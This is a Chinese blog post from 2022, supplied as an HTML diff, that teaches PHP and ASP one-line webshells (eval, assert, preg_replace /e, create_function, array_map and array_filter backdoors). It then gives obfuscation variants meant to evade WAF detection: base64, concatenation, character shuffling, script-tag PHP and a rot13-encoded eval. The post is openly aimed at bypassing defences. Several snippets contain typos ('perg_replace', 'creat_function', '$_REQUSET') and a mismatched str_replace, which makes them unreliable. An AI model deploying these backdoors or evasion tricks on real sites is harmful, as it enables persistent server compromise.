@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html  lang="zh-CN" >
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#fff" id="theme-color">
+  <meta name="description" content="混口饭吃">
+  <link rel="icon" href="/img/logo.png">
+  <title>webshell应用及变形免杀</title>
+  
+  
+  <meta property="og:title" content="webshell应用及变形免杀">
+  
+  
+  <meta property="og:url" content="http://example.com/2022/01/13/webshell%E5%BA%94%E7%94%A8%E5%8F%8A%E5%8F%98%E5%BD%A2/index.html">
+  
+  
+  <meta property="og:img" content="/img/author.jpg">
+  
+  
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:published_time" content="2022-01-13">
+  <meta property="og:article:modified_time" content="2022-01-16">
+  <meta property="og:article:author" content="YiHua">
+  
+  
+  <meta property="og:article:tag" content="webshell">
+  
+  
+  
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+    var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+      }
+    };
+    setDarkmode();
+  </script>
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+  </script>
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+  <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+
+  
+  
+<link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <div class="wrapper">
+    
+    <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+      <img class="navbar-logo-img" src="/img/logo.png" alt="logo">
+      
+      <span class="navbar-logo-dsc">混口饭吃</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+    <a href="/" class="navbar-menu-item">
+    
+    首页
+    
+    </a>
+    
+    <a href="/archives" class="navbar-menu-item">
+    
+    归档
+    
+    </a>
+    
+    <a href="/tags" class="navbar-menu-item">
+    
+    标签
+    
+    </a>
+    
+    <a href="/categories" class="navbar-menu-item">
+    
+    分类
+    
+    </a>
+    
+    <a href="/about" class="navbar-menu-item">
+    
+    关于
+    
+    </a>
+    
+    <a href="/links" class="navbar-menu-item">
+    
+    友链
+    
+    </a>
+    
+    <a class="navbar-menu-item darknavbar" id="dark"><i class="iconfont icon-weather"></i></a>
+    <a class="navbar-menu-item searchnavbar" id="search"><i class="iconfont icon-search" style="font-size: 1.2rem; font-weight: 400;"></i></a>
+  </div>
+</nav>
+    
+    <div id="local-search" style="display: none;">
+      <input class="navbar-menu-item" id="search-input" placeholder="请输入搜索内容...">
+      <div id="search-content"></div>
+    </div>
+    
+    <div class="section-wrap">
+      <div class="container">
+        <div class="columns">
+          <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      webshell应用及变形免杀
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2022-01-13T15:29:49.921Z">
+      <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
+      <span>2022-01-13</span>
+    </time>
+    
+    <span class="dot"></span>
+    
+    <a href="/categories/web安全/" class="post-meta-link">web安全</a>
+    
+    
+    
+    <span class="dot"></span>
+    <span>1.1k 字</span>
+    
+  </div>
+  
+  <div class="post-meta post-show-meta" style="margin-top: -10px;">
+    <div style="display: flex; align-items: center;">
+      <i class="iconfont icon-biaoqian" style="margin-right: 2px; font-size: 1.15rem;"></i>
+      
+      
+        <a href="/tags/webshell/" class="post-meta-link">webshell</a>
+      
+    </div>
+  </div>
+  
+  </header>
+  <div id="section" class="post-content">
+    <h3 id="一：webshell介绍"><a href="#一：webshell介绍" class="headerlink" title="一：webshell介绍"></a>一：webshell介绍</h3><h4 id="1-什么是webshell？"><a href="#1-什么是webshell？" class="headerlink" title="1.什么是webshell？"></a>1.什么是webshell？</h4><p>1.webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门</p>
+<p>2.由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具</p>
+<p>3.攻击者可以利用webshell从而达到长期控制网站服务器的目的，并获得执行操作权</p>
+<h4 id="2-分类"><a href="#2-分类" class="headerlink" title="2.分类"></a>2.分类</h4><p>1.大马</p>
+<p>•大马体积大，一般在50k以上</p>
+<p>•隐蔽性差</p>
+<p>•功能多，一般都包括提权功能，磁盘管理，数据库连接</p>
+<p>2.小马</p>
+<p>•体积小，隐蔽性强</p>
+<p>•能与图片结合在一起上传</p>
+<p>•可以利用解析漏洞来运行</p>
+<p>•功能少，一般只有上传功能</p>
+<p>3.一句话木马</p>
+<p>•代码简短，通常只有一行代码</p>
+<p>•使用灵活，可以作为单独的文件也可以插入正常文件</p>
+<p>•变形非常多</p>
+<h4 id="3-一句话WebShell的执行原理"><a href="#3-一句话WebShell的执行原理" class="headerlink" title="3.一句话WebShell的执行原理"></a>3.一句话WebShell的执行原理</h4><h4 id="4-常见的代码执行函数"><a href="#4-常见的代码执行函数" class="headerlink" title="4.常见的代码执行函数"></a>4.常见的代码执行函数</h4><h5 id="1-PHP中常见的代码执行函数"><a href="#1-PHP中常见的代码执行函数" class="headerlink" title="1.PHP中常见的代码执行函数"></a>1.PHP中常见的代码执行函数</h5><h6 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h6><pre class="highlight"><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span>				<span class="comment">//@符使这行代码不会出现报错 cmd为接收参数</span></span><br></pre>
+
+<h6 id="assert-函数"><a href="#assert-函数" class="headerlink" title="assert()函数"></a>assert()函数</h6><p>该函数在mysql数据库7.0版本就不再使用了</p>
+<pre class="highlight"><span class="line"><span class="meta">&lt;?php</span> @assert(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre>
+
+<h6 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace()函数"></a>preg_replace()函数</h6><p>•preg_replace()函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使preg_replace() 将replacement 参数当作PHP 码</p>
+<p>•5.5版本/e修饰符被弃用；7.0版本不再支持/e修饰符</p>
+<pre class="highlight"><span class="line"><span class="meta">&lt;?php</span> @perg_replace(<span class="string">&quot;/abc/e&quot;</span>,<span class="variable">$_REQUSET</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="string">&quot;abcd&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre>
+
+<h6 id="create-function-函数"><a href="#create-function-函数" class="headerlink" title="create_function()函数"></a>create_function()函数</h6><p>create_function主要是用来创建匿名函数</p>
+<p>如果没有严格对参数传递进行过滤，攻击者可以构造字符串传递给create_function()执行任意命令</p>
+<pre class="highlight"><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$func</span> = creat_function(<span class="string">&quot;,<span class="subst">$_REQUSET</span>[&#x27;cmd&#x27;]&quot;</span>);</span><br><span class="line">	<span class="variable">$func</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre>
+
+<h6 id="array-map-函数"><a href="#array-map-函数" class="headerlink" title="array_map()函数"></a>array_map()函数</h6><p>•array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有的组</p>
+<p>•回调函数接受参数数目应该和传递给array_map() 函数的数组数一致</p>
+<pre class="highlight"><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//?func=system&amp;cmd=ipconfig</span></span><br><span class="line">	<span class="variable">$func</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line">	<span class="variable">$cmd</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line">	<span class="variable">$new_array</span>=array_map(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre>
+
+<h6 id="array-filter-函数"><a href="#array-filter-函数" class="headerlink" title="array_filter()函数"></a>array_filter()函数</h6><p>•array_filter( array $array [, callable $callback [,int $flag = 0 ]] ) : array</p>
+<p>•依次将array 数组中的每个值传递到callback 函数。如果callback 函数返回true，则array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变</p>
+<pre class="highlight"><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//?func=system&amp;cmd=whoami</span></span><br><span class="line">    <span class="variable">$cmd</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line">	<span class="variable">$func</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line">	array_filter(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre>
+
+<h5 id="2-asp语言的WebShell"><a href="#2-asp语言的WebShell" class="headerlink" title="2.asp语言的WebShell"></a>2.asp语言的WebShell</h5><pre class="highlight"><span class="line">&lt;%evalrequest(&quot;777&quot;)%&gt;</span><br><span class="line">&lt;%executerequest(&quot;777&quot;)%&gt;</span><br><span class="line">&lt;%execute(request(&quot;777&quot;))%&gt;&lt;%executeGlobalrequest(&quot;777&quot;)%&gt;&lt;%eval(Request(chr(35)))%&gt; </span><br></pre>
+
+<h3 id="二：webshell变形免杀"><a href="#二：webshell变形免杀" class="headerlink" title="二：webshell变形免杀"></a>二：webshell变形免杀</h3><h4 id="1-变形的目的"><a href="#1-变形的目的" class="headerlink" title="1.变形的目的"></a>1.变形的目的</h4><p>waf通常以关键字判断是否为一句话木马，但是一句话木马的变形有很多。</p>
+<p>都是为了绕过waf.</p>
+<h4 id="2-常见的变形方法"><a href="#2-常见的变形方法" class="headerlink" title="2.常见的变形方法"></a>2.常见的变形方法</h4><h6 id="1-str-replace-函数"><a href="#1-str-replace-函数" class="headerlink" title="1.str_replace()函数"></a>1.str_replace()函数</h6><p>在第三个参数中，查找第一个参数，并替换成第二个参数，这里就相当于删除abc</p>
+<pre class="highlight"><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = str_replace(<span class="string">&quot;bac&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;eabcvabcaabceabcl&quot;</span>);		<span class="comment">//$a = eval</span></span><br><span class="line">	<span class="variable">$a</span>(<span class="variable">$_REQUSET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre>
+
+<h6 id="2-base64-decode-函数"><a href="#2-base64-decode-函数" class="headerlink" title="2.base64_decode()函数"></a>2.base64_decode()函数</h6><pre class="highlight"><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=base64_decode(<span class="string">&quot;YXNzZXJ0&quot;</span>);		<span class="comment">//$a = assert</span></span><br><span class="line">	<span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre>
+
+<h6 id="3-利用”-”操作符"><a href="#3-利用”-”操作符" class="headerlink" title="3.利用”.”操作符"></a>3.利用”.”操作符</h6><p>在PHP中，字符串之间连接使用的是“点”来实现的，可以把两个或两个以上的字符串连接成一个字符串</p>
+<pre class="highlight"><span class="line">&lt;php</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&quot;as&quot;</span>.<span class="string">&quot;se&quot;</span>;</span><br><span class="line">	<span class="variable">$b</span>=<span class="string">&quot;r&quot;</span>.<span class="string">&quot;t&quot;</span>;</span><br><span class="line">	<span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line">	<span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre>
+
+<h6 id="4-更换数据来源"><a href="#4-更换数据来源" class="headerlink" title="4.更换数据来源"></a>4.更换数据来源</h6><pre class="highlight"><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$_REQUEST</span>[a](<span class="variable">$_REQUEST</span>[cmd]); <span class="comment">//利用方法：a=assert&amp;cmd=phpinfo();<span class="meta">?&gt;</span><span class="meta">&lt;?</span>			           php@assert($_REQUEST[$_REQUEST[b]]);  //利用方法：b=cmd&amp;cmd=phpinfo();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre>
+
+<h6 id="5-替代标签"><a href="#5-替代标签" class="headerlink" title="5.替代标签"></a>5.替代<??>标签</h6><p>通过改变php的标签特征来绕过waf进而达到免杀的效果</p>
+<pre class="highlight"><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">    @assert(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])</span><br><span class="line">&lt;/script&gt;</span><br></pre>
+
+<h6 id="6-字符串组合隐藏关键字"><a href="#6-字符串组合隐藏关键字" class="headerlink" title="6.字符串组合隐藏关键字"></a>6.字符串组合隐藏关键字</h6><p>将需要隐藏的字符随机打乱，首先定义一些随机字符串，再调用打乱后的字符顺序并拼接成有效的参数</p>
+<pre class="highlight"><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;abcsqebrt&#x27;</span>;</span><br><span class="line">	<span class="variable">$a</span> =<span class="variable">$str</span>[<span class="number">0</span>].<span class="variable">$str</span>[<span class="number">3</span>].<span class="variable">$str</span>[<span class="number">3</span>].<span class="variable">$str</span>[<span class="number">5</span>].<span class="variable">$str</span>[<span class="number">7</span>].<span class="variable">$str</span>[<span class="number">8</span>];</span><br><span class="line">	@<span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre>
+
+<h6 id="7-使用对象，类，内置函数实现免杀"><a href="#7-使用对象，类，内置函数实现免杀" class="headerlink" title="7.使用对象，类，内置函数实现免杀"></a>7.使用对象，类，内置函数实现免杀</h6><pre class="highlight"><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">magic</span></span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> <span class="variable">$xw</span> = <span class="literal">null</span>;</span><br><span class="line">    	<span class="keyword">public</span> <span class="variable">$xl</span> = <span class="literal">null</span>;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;xw = <span class="string">&#x27;rinv($_CBFG[n]);&#x27;</span>;		<span class="comment">//凯撒加密方法</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;xl = str_rot13(<span class="keyword">$this</span>-&gt;xw);     <span class="comment">//凯撒解密函数str_rot13偏移13位</span></span><br><span class="line">            @<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;xl);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> magic();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre>
+
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
+  </div>
+  <div>
+  
+  <div class="post-note note-warning copyright" style="margin-top: 42px">
+    <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/about">YiHua</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/2022/01/13/webshell%E5%BA%94%E7%94%A8%E5%8F%8A%E5%8F%98%E5%BD%A2/">http://example.com/2022/01/13/webshell%E5%BA%94%E7%94%A8%E5%8F%8A%E5%8F%98%E5%BD%A2/</a></p>
+    <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
+  </div>
+  
+  </div>
+</article>
+<div class="nav">
+  
+  <div class="nav-item-prev">
+    <a href="/2022/01/16/SQL注入原理和手工注入流程/" class="nav-link">
+      <i class="iconfont icon-left nav-prev-icon"></i>
+      <div>
+        <div class="nav-label">上一篇</div>
+        
+        <div class="nav-title">SQL注入原理和手工注入流程 </div>
+        
+      </div>
+    </a>
+  </div>
+  
+  
+  <div class="nav-item-next">
+    <a href="/2022/01/08/Mysql数据库/" class="nav-link">
+      <div>
+        <div class="nav-label">下一篇</div>
+        
+        <div class="nav-title">Mysql数据库 </div>
+        
+      </div>
+      <i class="iconfont icon-right nav-next-icon"></i>
+    </a>
+  </div>
+  
+</div>
+
+<div class="card card-content toc-card" id="mobiletoc">
+  <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9Awebshell%E4%BB%8B%E7%BB%8D"><span class="toc-text">一：webshell介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFwebshell%EF%BC%9F"><span class="toc-text">1.什么是webshell？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%86%E7%B1%BB"><span class="toc-text">2.分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%B8%80%E5%8F%A5%E8%AF%9DWebShell%E7%9A%84%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="toc-text">3.一句话WebShell的执行原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">4.常见的代码执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-PHP%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">1.PHP中常见的代码执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#eval-%E5%87%BD%E6%95%B0"><span class="toc-text">eval()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#assert-%E5%87%BD%E6%95%B0"><span class="toc-text">assert()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#preg-replace-%E5%87%BD%E6%95%B0"><span class="toc-text">preg_replace()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#create-function-%E5%87%BD%E6%95%B0"><span class="toc-text">create_function()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#array-map-%E5%87%BD%E6%95%B0"><span class="toc-text">array_map()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#array-filter-%E5%87%BD%E6%95%B0"><span class="toc-text">array_filter()函数</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-asp%E8%AF%AD%E8%A8%80%E7%9A%84WebShell"><span class="toc-text">2.asp语言的WebShell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Awebshell%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80"><span class="toc-text">二：webshell变形免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8F%98%E5%BD%A2%E7%9A%84%E7%9B%AE%E7%9A%84"><span class="toc-text">1.变形的目的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%98%E5%BD%A2%E6%96%B9%E6%B3%95"><span class="toc-text">2.常见的变形方法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-str-replace-%E5%87%BD%E6%95%B0"><span class="toc-text">1.str_replace()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-base64-decode-%E5%87%BD%E6%95%B0"><span class="toc-text">2.base64_decode()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E2%80%9D-%E2%80%9D%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-text">3.利用”.”操作符</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-%E6%9B%B4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%9D%A5%E6%BA%90"><span class="toc-text">4.更换数据来源</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5-%E6%9B%BF%E4%BB%A3%E6%A0%87%E7%AD%BE"><span class="toc-text">5.替代标签</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#6-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%84%E5%90%88%E9%9A%90%E8%97%8F%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-text">6.字符串组合隐藏关键字</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#7-%E4%BD%BF%E7%94%A8%E5%AF%B9%E8%B1%A1%EF%BC%8C%E7%B1%BB%EF%BC%8C%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80"><span class="toc-text">7.使用对象，类，内置函数实现免杀</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text"></span></a></li></ol>
+</div></main>
+          <aside class="left-column">
+            
+            <div class="card card-author">
+              
+<img src="/img/author.jpg" class="author-img">
+
+<p class="author-name">YiHua</p>
+<p class="author-description">谨言  深思  笃行</p>
+<div class="author-message">
+  <a class="author-posts-count" href="/archives">
+    <span>27</span>
+    <span>文章</span>
+  </a>
+  <a class="author-categories-count" href="/categories">
+    <span>10</span>
+    <span>分类</span>
+  </a>
+  <a class="author-tags-count" href="/tags">
+    <span>9</span>
+    <span>标签</span>
+  </a>
+</div>
+
+            </div>
+            
+            <div class="sticky-tablet">
+  
+  
+  <article class="display-when-two-columns spacer">
+    <div class="card card-content toc-card">
+      <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9Awebshell%E4%BB%8B%E7%BB%8D"><span class="toc-text">一：webshell介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFwebshell%EF%BC%9F"><span class="toc-text">1.什么是webshell？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%86%E7%B1%BB"><span class="toc-text">2.分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%B8%80%E5%8F%A5%E8%AF%9DWebShell%E7%9A%84%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="toc-text">3.一句话WebShell的执行原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">4.常见的代码执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-PHP%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">1.PHP中常见的代码执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#eval-%E5%87%BD%E6%95%B0"><span class="toc-text">eval()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#assert-%E5%87%BD%E6%95%B0"><span class="toc-text">assert()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#preg-replace-%E5%87%BD%E6%95%B0"><span class="toc-text">preg_replace()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#create-function-%E5%87%BD%E6%95%B0"><span class="toc-text">create_function()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#array-map-%E5%87%BD%E6%95%B0"><span class="toc-text">array_map()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#array-filter-%E5%87%BD%E6%95%B0"><span class="toc-text">array_filter()函数</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-asp%E8%AF%AD%E8%A8%80%E7%9A%84WebShell"><span class="toc-text">2.asp语言的WebShell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Awebshell%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80"><span class="toc-text">二：webshell变形免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8F%98%E5%BD%A2%E7%9A%84%E7%9B%AE%E7%9A%84"><span class="toc-text">1.变形的目的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%98%E5%BD%A2%E6%96%B9%E6%B3%95"><span class="toc-text">2.常见的变形方法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-str-replace-%E5%87%BD%E6%95%B0"><span class="toc-text">1.str_replace()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-base64-decode-%E5%87%BD%E6%95%B0"><span class="toc-text">2.base64_decode()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E2%80%9D-%E2%80%9D%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-text">3.利用”.”操作符</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-%E6%9B%B4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%9D%A5%E6%BA%90"><span class="toc-text">4.更换数据来源</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5-%E6%9B%BF%E4%BB%A3%E6%A0%87%E7%AD%BE"><span class="toc-text">5.替代标签</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#6-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%84%E5%90%88%E9%9A%90%E8%97%8F%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-text">6.字符串组合隐藏关键字</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#7-%E4%BD%BF%E7%94%A8%E5%AF%B9%E8%B1%A1%EF%BC%8C%E7%B1%BB%EF%BC%8C%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80"><span class="toc-text">7.使用对象，类，内置函数实现免杀</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text"></span></a></li></ol>
+    </div>
+  </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header"><i class="iconfont icon-fenlei" style="padding-right: 2px;"></i>分类</div>
+  <div class="categories-list">
